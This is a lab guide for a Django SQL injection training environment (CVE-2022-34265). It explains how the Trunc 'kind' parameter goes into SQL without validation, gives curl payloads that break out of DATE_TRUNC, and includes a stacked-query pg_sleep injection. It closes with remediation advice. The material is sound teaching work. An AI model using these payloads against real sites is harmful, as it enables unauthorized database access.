# Django Trunc & Extract Database Functions SQL Injection (CVE-2022-34265)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Django Trunc & Extract Database Functions SQL Injection (CVE-2022-34265)**.

- **Target Directory**: `Classes/02_web_penetration_tester/16_advanced_sql_injection/django_cve_2022_34265`
- **Default Port(s)**: `8238:8000`
- **CLI Shortcut**: `./lab start django-trunc-sqli`

---

## Architecture & Service Map

- **Containers**:
  - `cyberlab_02_django_34265_app` (Django 4.0.5 web application exposed on host port 8238, mapped to internal port 8000)
  - `cyberlab_02_django_34265_db` (PostgreSQL 13 backend database on internal port 5432)
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit

---

## Vulnerability Mechanics

Django 3.2 before 3.2.14 and 4.0 before 4.0.6 are vulnerable to SQL injection when untrusted user input is passed directly to the `kind` parameter in `Trunc()` or the `lookup_name` parameter in `Extract()` date/time database functions.

In PostgreSQL and other database backends, `Trunc('created_time', kind)` maps to `DATE_TRUNC('<kind>', "vuln_weblog"."created_time")`, while `Extract('created_time', lookup_name)` maps to `EXTRACT('<lookup_name>' FROM "vuln_weblog"."created_time")`.

Because Django failed to validate the `kind` and `lookup_name` arguments against a safe allowlist before interpolating them into the raw SQL string, an attacker can break out of the string literal using single quotes (`'`) or closing parentheses/clauses to execute arbitrary SQL commands.

### Technical Root Cause

The `TruncBase` and `Extract` classes in `django.db.models.functions.datetime` directly interpolated the `kind` or `lookup_name` attribute into the SQL format template (`DATE_TRUNC('%s', ...)` or `EXTRACT('%s' FROM ...)`). Because these attributes were treated as trusted identifiers rather than parameterized SQL variables, attackers could inject SQL syntax directly into the query structure.

---

## Verification & Exploitation Guide

### 1. Verify Application Availability

Send a basic HTTP request to the root URL to verify that the application returns HTTP 200:

```bash
curl -i "http://localhost:8238/"
```

_Expected response_: HTTP 200 OK with a JSON array aggregating recent request timestamps:

```json
[{ "time": "2026-10-18T10:50:00", "count": 1 }]
```

### 2. Verify Normal Query Aggregation

Test normal aggregation by minute using the `date` parameter:

```bash
curl -s "http://localhost:8238/?date=minute"
```

### 3. Verify SQL Injection Error via Trunc(`kind`)

Supply a single quote payload in the `date` parameter to verify syntax breakout in the `DATE_TRUNC()` query:

```bash
curl -s "http://localhost:8238/?date=xxxx%27xxxx" | grep -A 5 "ProgrammingError"
```

_Expected response_: A PostgreSQL error confirming SQL injection in `DATE_TRUNC`:

```text
ProgrammingError at /
syntax error at or near "xxxx"
LINE 1: SELECT DATE_TRUNC('xxxx'xxxx', "vuln_weblog"."created_time")...
```

### 4. Time-Based / Blind Injection Verification

Attackers can break out of the function call to execute subqueries or sleep statements:

```bash
curl "http://localhost:8238/?date=minute%27,%20%22vuln_weblog%22.%22created_time%22)%20FROM%20%22vuln_weblog%22;SELECT%20pg_sleep(5)--"
```

---

## Defensive Remediation & Hardening

- Upgrade Django to version **4.0.6**, **3.2.14**, or later where `kind` and `lookup_name` values are strictly validated against allowlists.
- Never pass unvalidated user input directly into Django database functions (`Trunc()`, `Extract()`).
- Implement strict server-side schema validation (allowlist: `year`, `month`, `day`, `hour`, `minute`, `second`).

---

## References & Advisories

- **Official Vulhub Repository**: [Vulhub Django CVE-2022-34265](https://github.com/vulhub/vulhub/tree/master/django/CVE-2022-34265)
- **Django Security Advisory**: [Django security releases: CVE-2022-34265 (July 4, 2022)](https://www.djangoproject.com/weblog/2022/jul/04/security-releases/)
- **Django Source Patch**: [Commit 0dc9c016fadb71a067e5a42be30164e3f96c0492](https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492)

---

## Verified Video Walkthrough

- **Video Title**: [Django SQL Injection](https://www.youtube.com/watch?v=urhqo6puILQ)
- **Direct URL**: https://www.youtube.com/watch?v=urhqo6puILQ
